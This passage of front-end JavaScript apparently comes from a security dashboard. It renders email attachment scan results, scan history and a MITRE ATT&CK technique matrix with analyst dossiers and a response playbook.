            else if (a.verdict === "SUSPICIOUS") sevCls = "bg-amber-500/15 text-amber-300 border-amber-500/30";

            const card = document.createElement("div");
            card.className = "p-4 rounded-xl bg-[#0b0f17] border border-[#1b2538] space-y-2";
            card.innerHTML = `
                <div class="flex flex-wrap items-center justify-between gap-2">
                    <div class="font-bold text-white mono">${escapeHtml(a.filename)} <span class="text-slate-500 font-normal">(${escapeHtml(a.size_bytes)} bytes)</span></div>
                    <div class="flex items-center gap-2">
                        <span class="text-[11px] text-slate-400 mono">magic: ${escapeHtml(a.detected_magic_type)}</span>
                        <span class="px-2 py-0.5 rounded text-[10px] font-bold uppercase border ${sevCls}">${escapeHtml(a.verdict)} (${Math.round(a.risk_score)}/100)</span>
                    </div>
                </div>
                <div class="text-[11px] text-slate-400 mono break-all">SHA-256: ${escapeHtml(a.sha256)}</div>
                ${(a.findings || []).length ? `<ul class="space-y-1 text-slate-300 pt-1">${a.findings.map(f => `<li class="flex gap-1.5"><span class="text-rose-400">•</span><span>${escapeHtml(f)}</span></li>`).join("")}</ul>` : `<p class="text-emerald-400">No malicious attachment payloads detected.</p>`}
                ${(a.archive_entries || []).length ? `<div class="text-[11px] text-slate-400 pt-1">Archive Entries: <span class="mono text-slate-300">${escapeHtml(a.archive_entries.join(", "))}</span></div>` : ""}
            `;
            attWrap.appendChild(card);
        });
    }

    // Raw Headers Table
    const hdrTbody = document.getElementById("eml-headers-tbody");
    hdrTbody.innerHTML = (data.headers || []).map(h => `
        <tr class="border-b border-[#161f30]">
            <td class="py-1.5 pr-3 text-slate-400 font-semibold mono align-top whitespace-nowrap">${escapeHtml(h.name)}</td>
            <td class="py-1.5 text-slate-200 mono break-all">${escapeHtml(h.value)}</td>
        </tr>
    `).join("");
}

async function loadEmailHistory() {
    const tbody = document.getElementById("eml-history-tbody");
    if (!tbody) return;
    try {
        const resp = await fetch("/api/email/scans?limit=15");
        if (!resp.ok) return;
        const rows = await resp.json();
        tbody.innerHTML = "";
        if (!rows.length) {
            tbody.innerHTML = `<tr><td colspan="6" class="text-center py-5 text-slate-500">No .eml files analyzed yet.</td></tr>`;
            return;
        }
        rows.forEach(r => {
            let bCls = "bg-emerald-500/10 text-emerald-400 border-emerald-500/30";
            if (r.verdict === "MALICIOUS") bCls = "bg-rose-500/10 text-rose-400 border-rose-500/30";
            else if (r.verdict === "HIGH_RISK" || r.verdict === "SUSPICIOUS") bCls = "bg-amber-500/10 text-amber-400 border-amber-500/30";

            const tr = document.createElement("tr");
            tr.className = "border-b border-[#1b2538] hover:bg-[#141b29]";
            tr.innerHTML = `
                <td class="py-2.5 px-3 mono text-slate-400">${escapeHtml(r.email_id)}</td>
                <td class="py-2.5 px-3 font-semibold text-white truncate max-w-xs">${escapeHtml(r.subject || r.filename)}</td>
                <td class="py-2.5 px-3 mono text-slate-300 truncate max-w-xs">${escapeHtml(r.from_address || "-")}</td>
                <td class="py-2.5 px-3 text-center font-bold text-white">${Math.round(r.overall_score || 0)}</td>
                <td class="py-2.5 px-3 text-center"><span class="px-2 py-0.5 rounded text-[10px] font-semibold border ${bCls}">${escapeHtml(r.verdict)}</span></td>
                <td class="py-2.5 px-3 text-right whitespace-nowrap space-x-2">
                    <button onclick="viewInMitre({ emailId: '${escapeHtml(r.email_id)}' })" class="text-amber-400 hover:underline">ATT&amp;CK</button>
                    <button onclick="inspectEmailScan('${escapeHtml(r.email_id)}')" class="text-purple-400 hover:underline">Inspect</button>
                </td>
            `;
            tbody.appendChild(tr);
        });
    } catch (e) {
        console.error("Failed to load email history:", e);
    }
}

async function inspectEmailScan(emailId) {
    try {
        const resp = await fetch(`/api/email/scans/${encodeURIComponent(emailId)}`);
        if (!resp.ok) return;
        const data = await resp.json();
        displayEmailReport(data);
    } catch (e) {
        alert("Failed to load email report: " + e.message);
    }
}

// ===================================================================
// 10. MITRE ATT&CK Behavioral Mapping & Investigation Dossier
// ===================================================================
let mitreState = {
    report: null,
    selectedTacticId: null,
    selectedTechniqueId: null,
    searchQuery: "",
};

function initMitreAttack() {
    const scopeSel = document.getElementById("mitre-scope-select");
    const targetInput = document.getElementById("mitre-target-id");
    const searchInput = document.getElementById("mitre-search-input");
    const btnLoad = document.getElementById("btn-mitre-load");
    const btnReset = document.getElementById("btn-mitre-reset");

    if (!btnLoad) return;

    const triggerScopeLoad = () => {
        const scope = scopeSel ? scopeSel.value : "workspace";
        const val = targetInput ? targetInput.value.trim() : "";
        if (scope === "scan_id" && val) return loadMitreReport({ scanId: val });
        if (scope === "sandbox_id" && val) return loadMitreReport({ sandboxId: val });
        if (scope === "email_id" && val) return loadMitreReport({ emailId: val });
        return loadMitreReport({});
    };

    btnLoad.addEventListener("click", triggerScopeLoad);
    if (targetInput) {
        targetInput.addEventListener("keydown", e => {
            if (e.key === "Enter") {
                e.preventDefault();
                triggerScopeLoad();
            }
        });
    }

    if (btnReset) {
        btnReset.addEventListener("click", () => {
            mitreState.selectedTacticId = null;
            mitreState.selectedTechniqueId = null;
            mitreState.searchQuery = "";
            if (scopeSel) scopeSel.value = "workspace";
            if (targetInput) targetInput.value = "";
            if (searchInput) searchInput.value = "";
            loadMitreReport({});
        });
    }

    if (searchInput) {
        searchInput.addEventListener("input", () => {
            mitreState.searchQuery = searchInput.value.trim().toLowerCase();
            if (mitreState.report) {
                renderMitreTechniqueDossiers(mitreState.report);
            }
        });
    }
}

async function viewInMitre(opts = {}) {
    const scopeSel = document.getElementById("mitre-scope-select");
    const targetInput = document.getElementById("mitre-target-id");
    if (scopeSel && targetInput) {
        if (opts.scanId) {
            scopeSel.value = "scan_id";
            targetInput.value = opts.scanId;
        } else if (opts.sandboxId) {
            scopeSel.value = "sandbox_id";
            targetInput.value = opts.sandboxId;
        } else if (opts.emailId) {
            scopeSel.value = "email_id";
            targetInput.value = opts.emailId;
        } else {
            scopeSel.value = "workspace";
            targetInput.value = "";
        }
    }
    switchTab("tab-mitre", true);
    await loadMitreReport(opts);
}

async function loadMitreReport(opts = {}) {
    const matrixEl = document.getElementById("mitre-tactic-matrix");
    const listEl = document.getElementById("mitre-techniques-list");
    if (!matrixEl || !listEl) return;

    const params = new URLSearchParams();
    if (opts.scanId) params.set("scan_id", opts.scanId);
    else if (opts.sandboxId) params.set("sandbox_id", opts.sandboxId);
    else if (opts.emailId) params.set("email_id", opts.emailId);
    else params.set("limit", "50");

    try {
        const resp = await fetch(`/api/mitre?${params.toString()}`);
        if (!resp.ok) {
            const err = await resp.json().catch(() => ({}));
            listEl.innerHTML = `<div class="p-4 rounded-xl bg-rose-500/10 border border-rose-500/30 text-xs text-rose-300">Failed to load MITRE ATT&amp;CK report: ${escapeHtml(err.detail || resp.statusText)}</div>`;
            return;
        }
        const report = await resp.json();
        mitreState.report = report;
        mitreState.selectedTacticId = null;
        mitreState.selectedTechniqueId = null;
        renderMitreSummary(report);
        renderMitreMatrix(report);
        renderMitreTechniqueDossiers(report);
        renderMitrePlaybook(report);
    } catch (e) {
        listEl.innerHTML = `<div class="p-4 rounded-xl bg-rose-500/10 border border-rose-500/30 text-xs text-rose-300">Network error loading ATT&amp;CK data: ${escapeHtml(e.message)}</div>`;
    }
}

function mitreSeverityStyles(sev) {
    const level = String(sev || "LOW").toUpperCase();
    if (level === "CRITICAL") {
        return {
            cell: "detected-critical",
            badge: "bg-rose-500/20 text-rose-300 border-rose-500/40",
            text: "text-rose-300",
        };
    }
    if (level === "HIGH") {
        return {
            cell: "detected-high",
            badge: "bg-orange-500/20 text-orange-300 border-orange-500/40",
            text: "text-orange-300",
        };
    }
    if (level === "MEDIUM") {
        return {
            cell: "detected-medium",
            badge: "bg-amber-500/20 text-amber-300 border-amber-500/40",
            text: "text-amber-300",
        };
    }
    return {
        cell: "detected-low",
        badge: "bg-sky-500/15 text-sky-300 border-sky-500/35",
        text: "text-sky-300",
    };
}

function renderMitreSummary(report) {
    const sum = report.summary || {};
    const priority = String(report.investigation_priority || "LOW").toUpperCase();
    const prioEl = document.getElementById("mitre-priority-badge");
    if (prioEl) {
        let pCls = "bg-emerald-500/15 text-emerald-300 border-emerald-500/30";
        if (priority === "CRITICAL") pCls = "bg-rose-500/20 text-rose-300 border-rose-500/40";
        else if (priority === "HIGH") pCls = "bg-orange-500/20 text-orange-300 border-orange-500/40";
        else if (priority === "MODERATE" || priority === "MEDIUM") pCls = "bg-amber-500/20 text-amber-300 border-amber-500/40";
        prioEl.className = `px-2.5 py-0.5 rounded-full text-[11px] font-bold uppercase border ${pCls}`;
        prioEl.textContent = `PRIORITY: ${priority}`;
    }

    const ctxEl = document.getElementById("mitre-context-badge");
    if (ctxEl) ctxEl.textContent = `Scope: ${report.context_label || "Workspace Aggregate"}`;

    const techs = report.techniques || [];
    const totalBehaviors = techs.reduce((acc, t) => acc + (t.observed_behaviors || []).length, 0);
    document.getElementById("mitre-stat-techniques").textContent = sum.mapped_techniques_count ?? techs.length;
    document.getElementById("mitre-stat-tactics").textContent = `${sum.active_tactics_count ?? 0} / ${sum.total_tactics ?? 8}`;
    document.getElementById("mitre-stat-high").textContent = (sum.critical_count || 0) + (sum.high_count || 0);
    document.getElementById("mitre-stat-evidence").textContent = totalBehaviors;
    document.getElementById("mitre-stat-sources").textContent = `${sum.pivots_count ?? 0} hunt pivots`;
    document.getElementById("mitre-narrative").textContent = report.attack_narrative || "";
}

function renderMitreMatrix(report) {
    const matrixEl = document.getElementById("mitre-tactic-matrix");
    if (!matrixEl) return;
    matrixEl.innerHTML = "";

    const cols = report.tactic_matrix || [];
    cols.forEach(col => {
        const colDiv = document.createElement("div");
        colDiv.className = "mitre-tactic-col";

        const header = document.createElement("div");
        header.className = "mitre-tactic-header";
        header.innerHTML = `
            <div class="flex items-center justify-between gap-1">
                <span class="text-[10px] mono text-slate-400 font-semibold">${escapeHtml(col.tactic_id)}</span>
                <span class="px-1.5 py-0.2 rounded text-[10px] font-bold mono ${col.detected_count ? "bg-amber-500/20 text-amber-300 border border-amber-500/30" : "bg-[#151e30] text-slate-500"}">${escapeHtml(col.detected_count ?? 0)}/${escapeHtml(col.total_count ?? 0)}</span>
            </div>
            <div class="text-xs font-bold text-white mt-0.5 truncate" title="${escapeHtml(col.tactic_name)}">${escapeHtml(col.tactic_name)}</div>
        `;
        header.addEventListener("click", () => {
            mitreState.selectedTacticId = (mitreState.selectedTacticId === col.tactic_id) ? null : col.tactic_id;
            mitreState.selectedTechniqueId = null;
            renderMitreMatrix(report);
            renderMitreTechniqueDossiers(report);
        });
        colDiv.appendChild(header);

        const body = document.createElement("div");
        body.className = "mitre-tactic-body";

        (col.techniques || []).forEach(t => {
            const btn = document.createElement("button");
            btn.type = "button";
            const detected = Boolean(t.detected);
            const styles = detected ? mitreSeverityStyles(t.severity) : null;
            const isFocused = mitreState.selectedTechniqueId === t.technique_id ||
                (!mitreState.selectedTechniqueId && mitreState.selectedTacticId === col.tactic_id && detected);

            btn.className = `mitre-tech-cell ${detected ? styles.cell : "undetected"} ${isFocused ? "active-focus" : ""}`;
            btn.innerHTML = `
                <div class="flex items-center justify-between gap-1">
                    <span class="text-[10px] mono font-bold ${detected ? styles.text : "text-slate-400"}">${escapeHtml(t.technique_id)}</span>
                    ${detected ? `<span class="text-[10px] mono font-bold text-slate-200">${escapeHtml(t.evidence_count || 1)}×</span>` : ""}
                </div>
                <div class="text-[11px] font-medium text-slate-200 leading-snug mt-0.5">${escapeHtml(t.technique_name || t.name || t.technique_id)}</div>
            `;
            if (detected) {
                btn.addEventListener("click", () => {
                    mitreState.selectedTacticId = null;
                    mitreState.selectedTechniqueId = t.technique_id;
                    renderMitreMatrix(report);
                    renderMitreTechniqueDossiers(report);
                    const card = document.getElementById(`mitre-card-${t.technique_id}`);
                    if (card) {
                        card.scrollIntoView({ behavior: "smooth", block: "center" });
                    }
                });
            }
            body.appendChild(btn);
        });

        colDiv.appendChild(body);
        matrixEl.appendChild(colDiv);
    });
}

function renderMitreTechniqueDossiers(report) {
    const listEl = document.getElementById("mitre-techniques-list");
    const filterBanner = document.getElementById("mitre-tactic-filter");
    const countBadge = document.getElementById("mitre-dossier-count");
    if (!listEl) return;

    const allTechs = report.techniques || [];
    const query = mitreState.searchQuery;

    const filtered = allTechs.filter(t => {
        if (mitreState.selectedTacticId && t.tactic_id !== mitreState.selectedTacticId) return false;
        if (query) {
            const behaviors = (t.observed_behaviors || []).join(" ");
            const pivots = (t.hunting_pivots || []).join(" ");
            const hay = `${t.technique_id} ${t.technique_name || ""} ${t.tactic_name} ${behaviors} ${pivots}`.toLowerCase();
            if (!hay.includes(query)) return false;
        }
        return true;
    });

    if (filterBanner) {
        if (mitreState.selectedTacticId) {
            filterBanner.textContent = `Filtered to tactic ${mitreState.selectedTacticId} (click header again to clear)`;
        } else if (mitreState.selectedTechniqueId) {
            filterBanner.textContent = `Focused technique ${mitreState.selectedTechniqueId}`;
        } else {
            filterBanner.textContent = "Showing all detected tactics (click any column header or cell to focus)";
        }
    }
    if (countBadge) {
        countBadge.textContent = `${filtered.length} technique${filtered.length === 1 ? "" : "s"} shown`;
    }

    listEl.innerHTML = "";
    if (!filtered.length) {
        listEl.innerHTML = `<div class="p-6 text-center rounded-xl bg-[#0b0f17] border border-[#1b2538] text-xs text-slate-400">No adversarial ATT&amp;CK behaviors matched the current scope or filter. Run a phishing URL scan, sandbox detonation, or .eml analysis to populate technique dossiers.</div>`;
        return;
    }

    filtered.forEach(t => {
        const sevStyles = mitreSeverityStyles(t.severity);
        const card = document.createElement("div");
        const pulse = mitreState.selectedTechniqueId === t.technique_id ? "highlight-pulse" : "";
        card.id = `mitre-card-${t.technique_id}`;
        card.className = `mitre-tech-card p-5 space-y-4 ${pulse}`;

        const behaviors = t.observed_behaviors || [];
        const evidenceItems = behaviors.map(ev =>
            `<li class="flex gap-2"><span class="text-rose-400 flex-shrink-0">•</span><span class="break-words">${escapeHtml(ev)}</span></li>`
        ).join("");

        const questionItems = (t.investigation_questions || []).map(q =>
            `<li class="flex gap-2"><span class="text-cyan-400 flex-shrink-0">?</span><span>${escapeHtml(q)}</span></li>`
        ).join("");

        const pivotItems = (t.hunting_pivots || []).map(p =>
            `<li class="flex gap-2"><span class="text-amber-400 flex-shrink-0">›</span><span class="mono break-all">${escapeHtml(p)}</span></li>`
        ).join("");

        const engineChips = (t.source_engines || []).map(eng =>
            `<span class="px-2 py-0.5 rounded bg-[#131b2c] border border-[#233149] text-[10px] mono text-slate-300">${escapeHtml(eng)}</span>`
        ).join("");

        const confVal = typeof t.confidence === "number" ? `${Math.round(t.confidence)}%` : escapeHtml(t.confidence);

        card.innerHTML = `
            <div class="flex flex-col md:flex-row md:items-center justify-between gap-3 border-b border-[#192336] pb-3">
                <div class="space-y-1">
                    <div class="flex flex-wrap items-center gap-2">
                        <span class="px-2.5 py-0.5 rounded text-xs font-bold mono border ${sevStyles.badge}">${escapeHtml(t.technique_id)}</span>
                        <h5 class="text-sm font-bold text-white">${escapeHtml(t.technique_name || t.technique_id)}</h5>
                        <span class="px-2 py-0.5 rounded text-[10px] font-semibold bg-[#141d2e] text-slate-300 border border-[#233149]">${escapeHtml(t.tactic_name)} (${escapeHtml(t.tactic_id)})</span>
                        <span class="px-2 py-0.5 rounded text-[10px] font-bold uppercase border ${sevStyles.badge}">${escapeHtml(String(t.severity || "medium").toUpperCase())} · Conf: ${confVal}</span>
                    </div>
                    <p class="text-xs text-slate-400">${escapeHtml(t.summary || "")}</p>
                </div>
                <a href="${escapeHtml(t.mitre_url || "https://attack.mitre.org/")}" target="_blank" rel="noopener noreferrer" class="text-[11px] text-blue-400 hover:underline mono whitespace-nowrap flex-shrink-0">MITRE Ref ↗</a>
            </div>

            <div class="grid grid-cols-1 lg:grid-cols-3 gap-4 text-xs">
                <div class="p-3.5 rounded-xl bg-[#090d16] border border-[#192336] space-y-2">
                    <div class="text-[11px] font-bold uppercase tracking-wider text-rose-300">Observed Behavioral Evidence (${behaviors.length})</div>
                    <ul class="space-y-1.5 text-slate-200">${evidenceItems || `<li class="text-slate-500">Behavioral match logged.</li>`}</ul>
                </div>

                <div class="p-3.5 rounded-xl bg-[#090d16] border border-[#192336] space-y-2">
                    <div class="text-[11px] font-bold uppercase tracking-wider text-cyan-300">Analyst Investigation Questions</div>
                    <ul class="space-y-1.5 text-slate-300">${questionItems}</ul>
                </div>

                <div class="p-3.5 rounded-xl bg-[#090d16] border border-[#192336] space-y-2">
                    <div class="text-[11px] font-bold uppercase tracking-wider text-amber-300">Threat Hunting Pivots</div>
                    <ul class="space-y-1.5 text-slate-300">${pivotItems}</ul>
                </div>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-3 text-[11px]">
                <div class="p-3 rounded-lg bg-[#0b101a] border border-[#192336]">
                    <span class="font-bold text-slate-400 uppercase tracking-wider block mb-0.5">SOC Detection Guidance</span>
                    <span class="text-slate-300">${escapeHtml(t.detection_guidance || "")}</span>
                </div>
                <div class="p-3 rounded-lg bg-[#0b101a] border border-[#192336]">
                    <span class="font-bold text-emerald-400 uppercase tracking-wider block mb-0.5">Recommended Mitigation</span>
                    <span class="text-slate-300">${escapeHtml(t.mitigation || "")}</span>
                </div>
            </div>

            ${engineChips ? `<div class="flex flex-wrap items-center gap-1.5 pt-1"><span class="text-[10px] uppercase tracking-wider text-slate-500 mr-1">Detecting Engines:</span>${engineChips}</div>` : ""}
        `;
        listEl.appendChild(card);
    });
}

function renderMitrePlaybook(report) {
    const pbEl = document.getElementById("mitre-playbook-list");
    if (!pbEl) return;
    const steps = report.playbook || [];
    if (!steps.length) {
        pbEl.innerHTML = `<li class="text-slate-500">No urgent containment playbook actions triggered for this scope.</li>`;
        return;
    }
    pbEl.innerHTML = steps.map((step, i) => {
        if (typeof step === "string") {
            return `<li class="flex items-start gap-2.5 p-2.5 rounded-lg bg-[#0b0f17] border border-[#1b2538]"><span class="px-1.5 py-0.5 rounded bg-amber-500/15 text-amber-300 border border-amber-500/30 mono text-[10px] font-bold flex-shrink-0">${i + 1}</span><span class="text-slate-200 leading-relaxed">${escapeHtml(step)}</span></li>`;
        }
        const actionsHtml = (step.actions || []).map(a =>
            `<li class="flex gap-1.5 text-slate-300"><span class="text-amber-400">•</span><span>${escapeHtml(a)}</span></li>`
        ).join("");
        const pivotsHtml = (step.pivots || []).slice(0, 6).map(p =>
            `<span class="px-1.5 py-0.5 rounded bg-[#141d2e] border border-[#233149] mono text-[10px] text-cyan-300">${escapeHtml(p)}</span>`
        ).join("");
        return `
            <li class="p-3.5 rounded-xl bg-[#0b0f17] border border-[#1b2538] space-y-2">
                <div class="flex flex-wrap items-center justify-between gap-2">
                    <span class="text-xs font-bold text-amber-300">${escapeHtml(step.phase || `Phase ${i + 1}`)}</span>
                    <span class="text-[11px] text-slate-400">${escapeHtml(step.objective || "")}</span>
                </div>
                <ul class="space-y-1 text-xs">${actionsHtml}</ul>
                ${pivotsHtml ? `<div class="flex flex-wrap gap-1.5 pt-1">${pivotsHtml}</div>` : ""}
            </li>
        `;
    }).join("");
}
